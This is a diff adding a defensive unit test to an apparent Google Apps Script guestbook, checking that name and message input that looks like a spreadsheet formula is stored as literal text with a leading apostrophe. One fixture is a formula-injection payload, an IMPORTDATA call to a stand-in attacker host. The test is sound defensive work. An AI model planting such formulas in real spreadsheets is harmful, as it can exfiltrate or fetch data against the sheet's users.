@@ -67,6 +67,7 @@ function loadAppsScript() {
     appended,
     cacheValues,
     createGuestbook: vm.runInContext('createGuestbook_', context),
+    literalSheetText: vm.runInContext('literalSheetText_', context),
     route: vm.runInContext('route_', context)
   };
 }
@@ -130,6 +131,21 @@ test('입력한 이름은 공백만 정리해 유지한다', () => {
   const result = app.createGuestbook(input({ name: '  이름  ' }));
 
   assert.equal(result.name, '이름');
+});
+
+test('시트에 쓰는 수식 형태 문자열은 일반 텍스트로 강제한다', () => {
+  const app = loadAppsScript();
+  const name = '+SUM(A1:A2)';
+  const message = '=IMPORTDATA("https://attacker.example")';
+  const result = app.createGuestbook(input({ name, message }));
+
+  assert.equal(result.name, name);
+  assert.equal(result.message, message);
+  assert.equal(app.appended[0].object.name, "'" + name);
+  assert.equal(app.appended[0].object.message, "'" + message);
+  assert.equal(app.literalSheetText('-1+1'), "'-1+1");
+  assert.equal(app.literalSheetText('@SUM(A1:A2)'), "'@SUM(A1:A2)");
+  assert.equal(app.literalSheetText('안녕하세요'), '안녕하세요');
 });
 
 test('메시지와 비밀번호는 계속 필수다', () => {
